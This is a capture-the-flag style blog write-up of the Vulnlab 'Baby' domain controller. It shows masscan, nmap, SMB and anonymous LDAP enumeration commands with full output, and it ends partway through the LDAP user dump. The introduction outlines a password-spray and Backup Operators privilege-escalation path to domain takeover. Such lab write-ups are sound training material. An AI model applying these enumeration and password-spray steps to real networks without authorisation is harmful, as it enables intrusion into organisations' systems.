---
layout: post
title: Baby
date: 2024-10-16
categories:
  - Vulnlab
  - machine-easy-vl
image: /assets/img/VL/Baby.png
---

>Baby machine from vulnlab is machine mainly involved getting password from anonymous ldap access and in which by perform password spray against users from domain controllers, user caroline was found that has that password but you cannot login as seems you need to change it mainly can be caused not meeting password requirement or it was set by administrator.With use of smbpasswd, a user can change a password to new password meeting password requirement.Login with it to domain controllers, a user was found in group of backup operators with two privileges enabled that are important to be able to exploit.Exploit that group, you can own Domain Controllers and reclaim your realms.

# Enumeration
- Starting by scanning for ports

```
sudo masscan -p1-65535,U:1-65535 10.10.65.1 --rate=500 -e tun0|tee masscan
```

```
Discovered open port 135/tcp on 10.10.65.1                                     
Discovered open port 88/tcp on 10.10.65.1                                      
Discovered open port 139/tcp on 10.10.65.1                                     
Discovered open port 49675/tcp on 10.10.65.1                                   
Discovered open port 3268/tcp on 10.10.65.1                                    
Discovered open port 49667/tcp on 10.10.65.1                                   
Discovered open port 63689/tcp on 10.10.65.1                                   
Discovered open port 53/tcp on 10.10.65.1                                      
Discovered open port 636/tcp on 10.10.65.1                                     
Discovered open port 49674/tcp on 10.10.65.1                                   
Discovered open port 49669/tcp on 10.10.65.1                                   
Discovered open port 9389/tcp on 10.10.65.1                                    
Discovered open port 389/tcp on 10.10.65.1                                     
Discovered open port 464/tcp on 10.10.65.1                                     
Discovered open port 49664/tcp on 10.10.65.1                                   
Discovered open port 53/udp on 10.10.65.1                                      
Discovered open port 5357/tcp on 10.10.65.1                                    
Discovered open port 593/tcp on 10.10.65.1                                     
Discovered open port 3269/tcp on 10.10.65.1                                    
Discovered open port 63674/tcp on 10.10.65.1                                   
Discovered open port 3389/tcp on 10.10.65.1                                    
Discovered open port 5985/tcp on 10.10.65.1                                    
Discovered open port 445/tcp on 10.10.65.1
```

Since there are no any error or misbehaviour from masscan, will move with nmap to scan evey ports from masscan
```
nmap -sC -sV -p $(cat masscan| awk -F ' ' '{print $4}'|grep tcp| awk -F '/tcp' '{print $1}'|xargs|sed 's/ /,/g') -vvv 10.10.65.1 -oN nmap
```
Result
```
# Nmap 7.94SVN scan initiated Wed Oct 16 06:35:00 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -p 135,88,139,49675,3268,49667,63689,53,636,49674,49669,9389,389,464,49664,5357,593,3269,63674,3389,5985,445 -vvv -oN nmap 10.10.65.1
Nmap scan report for 10.10.65.1
Host is up, received echo-reply ttl 127 (0.28s latency).
Scanned at 2024-10-16 06:35:01 EDT for 139s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-16 10:35:12Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Issuer: commonName=BabyDC.baby.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-26T09:03:15
| Not valid after:  2025-01-25T09:03:15
| MD5:   a63f:e0e6:9c19:ba19:0f14:2198:bd20:3eb3
| SHA-1: 79c6:f752:73d0:6818:241e:6087:88b0:2a7f:b0bf:ec7f
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcigAwIBAgIQFwL4czAa9aBN7bpDVkexjDANBgkqhkiG9w0BAQsFADAZ
| MRcwFQYDVQQDEw5CYWJ5REMuYmFieS52bDAeFw0yNDA3MjYwOTAzMTVaFw0yNTAx
| MjUwOTAzMTVaMBkxFzAVBgNVBAMTDkJhYnlEQy5iYWJ5LnZsMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvntpU8oF4UIGBqJLsq7P1c3QjdjDakJb/qiQ
| oz9U+2z64TtePs20cvML7dm21cx/isH8XFlG23r1MhNl2C21Xd/gnET7piCETolV
| s+Z05Cvpm/l3TCVrg8MVxSQF8GuwxOoLI13aZ822/xiTyhsIEMH6G7hc+g3lbePr
| QKBTxcSjoohTXur97lveMYSWrBo1aLkJUYYFyhUipv637S9NAS2nF2UVIeZQbqDi
| XEy2dxNoTX0HSxfLcyNeXsvrdoh2EFPb5nAPD81Ogjrpix34hDS2Q/OTNL8hiIiI
| MpfE0JP06SCqaxkIs8X86/6vpgbh41dz659cSbL6hTyfAQPYVQIDAQABoyQwIjAT
| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
| ggEBADiIqN/vl7WhXDBvKxZpwTYdO/0Jovvp6BeucDMtCY7bj4BwifTzK2uBcGrd
| KmxOFqOub6j6wrISXTDBdU3qOLSndNyDLSihg69sMmW2toXGtgEr4VEJdl3aMflA
| fsk8bxr/qLWXSjffR+qkrEEjnxqaTb365SRYrBGPM++2yh/yz8ZHtm0catlDxG8I
| VNHzYX6m5B3VJC+lHhAdeUXDhyVvWlBbf5tHKKhY+QU4dijhMA4puS0V15dFfWDJ
| cg/QS0HaroEBpvm/Z1tz4ID1TOj5Wbuo4kz7zBnnAsphno/VRrG8bTf+niSiAbvg
| wrHcuksgbJuSK/OeFaovZ08SO9c=
|_-----END CERTIFICATE-----
|_ssl-date: 2024-10-16T10:36:46+00:00; +3s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-10-16T10:36:09+00:00
5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
63674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
63689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50610/tcp): CLEAN (Timeout)
|   Check 2 (port 53283/tcp): CLEAN (Timeout)
|   Check 3 (port 25676/udp): CLEAN (Timeout)
|   Check 4 (port 39715/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-10-16T10:36:09
|_  start_date: N/A
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 16 06:37:20 2024 -- 1 IP address (1 host up) scanned in 139.83 seconds
```
### Analysis from scanning
- It is windows Domain Controllers because of kerberos port and ldap being opened and with domain name - **baby.vl**
- The Machines itself is  **BabyDC.baby.vl**
- Access via login can be found - 445, 3389, 5985, 88
- They might be web server or not -  5357,5985, 49674, 593
- Dns Server - 53
**Methodologies**:
- As always start with **hanging fruits** before diving deep into enumeration
- Hanging fruits are as follows 445, 139/135, 389/3268, 88, web servers

## SMB ENUMERATION
- **Methodologies** to use when enumerate smb
```
Technologies used
Anonymous access
Guest access 
Random user access
```
- Operating System (nxc smb 4ip)
```
Windows Server 2022 Build 20348 x64
```

```
┌──(kali㉿kali)-[~/vulnlab/Baby]
└─$ nxc smb 10.10.65.1                              
SMB         10.10.65.1      445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
```
- Anonymous enabled but no shares
```
└─$ smbclient -L 10.10.65.1
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.65.1 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- Guest disabled
```
└─$ smbclient -L 10.10.65.1 -U guest
Password for [WORKGROUP\guest]:
session setup failed: NT_STATUS_ACCOUNT_DISABLED
```
- Random user dont work
```
└─$ smbclient -L 10.10.65.1 -U dsavdjsadksadcsa
Password for [WORKGROUP\dsavdjsadksadcsa]:
session setup failed: NT_STATUS_LOGON_FAILURE

```
**NOTE:** Nothing on smb

## LDAP ENUMERATION
- **Methodologies** used when enumerate ldap
```
Base enumeration
Anonymous ldap acecss
```
- Base Enumeration
```
ldapsearch -x -H ldap://10.10.65.1:389/ -s base namingcontexts
```
Output
```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=baby,DC=vl
namingcontexts: CN=Configuration,DC=baby,DC=vl
namingcontexts: CN=Schema,CN=Configuration,DC=baby,DC=vl
namingcontexts: DC=DomainDnsZones,DC=baby,DC=vl
namingcontexts: DC=ForestDnsZones,DC=baby,DC=vl

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
- Anonymous access
```
ldapsearch -x -b "dc=baby,dc=vl" -H ldap://10.10.65.1
```
Output
```
# extended LDIF
#
# LDAPv3
# base <dc=baby,dc=vl> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# baby.vl
dn: DC=baby,DC=vl

# Administrator, Users, baby.vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl

# Guest, Users, baby.vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121144952.0Z
whenChanged: 20211121144952.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=baby,DC=vl
uSNChanged: 8197
name: Guest
objectGUID:: 8XThJOa14ESxUfIZL3Bd9A==
userAccountControl: 66082
badPwdCount: 2
codePage: 0
countryCode: 0
badPasswordTime: 133735496017994243
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtW9QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# krbtgt, Users, baby.vl
dn: CN=krbtgt,CN=Users,DC=baby,DC=vl

# Domain Computers, Users, baby.vl
dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Domain Computers
description: All workstations and servers joined to the domain
distinguishedName: CN=Domain Computers,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12330
uSNChanged: 12332
name: Domain Computers
objectGUID:: 8qKP6f2OYESDGo4yvCZhJg==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWAwIAAA==
sAMAccountName: Domain Computers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Controllers, Users, baby.vl
dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl

# Schema Admins, Users, baby.vl
dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl

# Enterprise Admins, Users, baby.vl
dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl

# Cert Publishers, Users, baby.vl
dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Cert Publishers
description: Members of this group are permitted to publish certificates to th
 e directory
distinguishedName: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12342
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
uSNChanged: 12344
name: Cert Publishers
objectGUID:: x28ME5jSJ0W4XxnLFk8cGQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWBQIAAA==
sAMAccountName: Cert Publishers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Admins, Users, baby.vl
dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl

# Domain Users, Users, baby.vl
dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Domain Users
description: All domain users
distinguishedName: CN=Domain Users,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12348
memberOf: CN=Users,CN=Builtin,DC=baby,DC=vl
uSNChanged: 12350
name: Domain Users
objectGUID:: yrTYUBBtnkyRqzm+ARpbng==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWAQIAAA==
sAMAccountName: Domain Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Guests, Users, baby.vl
dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Domain Guests
description: All domain guests
distinguishedName: CN=Domain Guests,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12351
memberOf: CN=Guests,CN=Builtin,DC=baby,DC=vl
uSNChanged: 12353
name: Domain Guests
objectGUID:: 7f8QJoNCoka655vMSJ2Zww==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWAgIAAA==
sAMAccountName: Domain Guests
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Group Policy Creator Owners, Users, baby.vl
dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Group Policy Creator Owners
description: Members in this group can modify group policy for the domain
member: CN=Administrator,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12354
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
uSNChanged: 12391
name: Group Policy Creator Owners
objectGUID:: W6ir0I0zIU+vqIk7rbI/CQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWCAIAAA==
sAMAccountName: Group Policy Creator Owners
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# RAS and IAS Servers, Users, baby.vl
dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: RAS and IAS Servers
description: Servers in this group can access remote access properties of user
 s
distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12357
uSNChanged: 12359
name: RAS and IAS Servers
objectGUID:: wBcSheG2P0uiSxTMBNBFRw==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWKQIAAA==
sAMAccountName: RAS and IAS Servers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Allowed RODC Password Replication Group, Users, baby.vl
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Allowed RODC Password Replication Group
description: Members in this group can have their passwords replicated to all 
 read-only domain controllers in the domain
distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby
 ,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12402
uSNChanged: 12404
name: Allowed RODC Password Replication Group
objectGUID:: ejILJr5sg0SodTROtBWkKA==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWOwIAAA==
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Denied RODC Password Replication Group, Users, baby.vl
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Denied RODC Password Replication Group
description: Members in this group cannot have their passwords replicated to a
 ny read-only domain controllers in the domain
member: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
member: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
member: CN=Domain Admins,CN=Users,DC=baby,DC=vl
member: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
member: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
member: CN=Schema Admins,CN=Users,DC=baby,DC=vl
member: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
member: CN=krbtgt,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,
 DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12405
uSNChanged: 12433
name: Denied RODC Password Replication Group
objectGUID:: FlWRHCPS2kO+4s3ZtZ0CqQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWPAIAAA==
sAMAccountName: Denied RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Read-only Domain Controllers, Users, baby.vl
dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl

# Enterprise Read-only Domain Controllers, Users, baby.vl
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Enterprise Read-only Domain Controllers
description: Members of this group are Read-Only Domain Controllers in the ent
 erprise
distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby
 ,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12429
uSNChanged: 12431
name: Enterprise Read-only Domain Controllers
objectGUID:: VdcBFn79QU6kC1EKu4aWGw==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtW8gEAAA==
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Cloneable Domain Controllers, Users, baby.vl
dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Cloneable Domain Controllers
description: Members of this group that are domain controllers may be cloned.
distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12440
uSNChanged: 12442
name: Cloneable Domain Controllers
objectGUID:: AQdidj96k0yKAh5HXwjWWg==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWCgIAAA==
sAMAccountName: Cloneable Domain Controllers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Protected Users, Users, baby.vl
dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Protected Users
description: Members of this group are afforded additional protections against
  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=
 298939 for more information.
distinguishedName: CN=Protected Users,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12445
uSNChanged: 12447
name: Protected Users
objectGUID:: H0/844KdmEyf+3raVrqw6w==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWDQIAAA==
sAMAccountName: Protected Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Key Admins, Users, baby.vl
dn: CN=Key Admins,CN=Users,DC=baby,DC=vl

# Enterprise Key Admins, Users, baby.vl
dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl

# DnsAdmins, Users, baby.vl
dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: DnsAdmins
description: DNS Administrators Group
distinguishedName: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145238.0Z
whenChanged: 20211121145238.0Z
uSNCreated: 12486
uSNChanged: 12488
name: DnsAdmins
objectGUID:: jebp5c9rh0OaBfewI/Q3IQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWTQQAAA==
sAMAccountName: DnsAdmins
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 16010101000001.0Z

# DnsUpdateProxy, Users, baby.vl
dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: DnsUpdateProxy
description: DNS clients who are permitted to perform dynamic updates on behal
 f of some other clients (such as DHCP servers).
distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145238.0Z
whenChanged: 20211121145238.0Z
uSNCreated: 12491
uSNChanged: 12491
name: DnsUpdateProxy
objectGUID:: Yc+jX1fev062aq+aBhDmbQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWTgQAAA==
sAMAccountName: DnsUpdateProxy
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 16010101000001.0Z

# dev, Users, baby.vl
dn: CN=dev,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: dev
member: CN=Ian Walker,OU=dev,DC=baby,DC=vl
member: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
member: CN=Hugh George,OU=dev,DC=baby,DC=vl
member: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
member: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
distinguishedName: CN=dev,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151102.0Z
whenChanged: 20211121151103.0Z
displayName: dev
uSNCreated: 12789
uSNChanged: 12840
name: dev
objectGUID:: YbzrRV+4J0W4be5Cc4WJiQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWTwQAAA==
sAMAccountName: dev
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 16010101000001.0Z

# Jacqueline Barnett, dev, baby.vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Jacqueline Barnett
sn: Barnett
givenName: Jacqueline
distinguishedName: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Jacqueline Barnett
uSNCreated: 12793
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12798
name: Jacqueline Barnett
objectGUID:: /Lm9eucHIkS9Gr+pwGrvHA==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810632000928
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Jacqueline.Barnett
sAMAccountType: 805306368
userPrincipalName: Jacqueline.Barnett@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Ashley Webb, dev, baby.vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ashley Webb
sn: Webb
givenName: Ashley
distinguishedName: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Ashley Webb
uSNCreated: 12803
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12808
name: Ashley Webb
objectGUID:: P1UeCcUZGUO6xywh/3Gw/g==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810633407081
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Ashley.Webb
sAMAccountType: 805306368
userPrincipalName: Ashley.Webb@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Hugh George, dev, baby.vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Hugh George
sn: George
givenName: Hugh
distinguishedName: CN=Hugh George,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Hugh George
uSNCreated: 12813
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12818
name: Hugh George
objectGUID:: kzlvIum6eEqohHq3BwrYoA==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810634363083
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Hugh.George
sAMAccountType: 805306368
userPrincipalName: Hugh.George@baby.vl
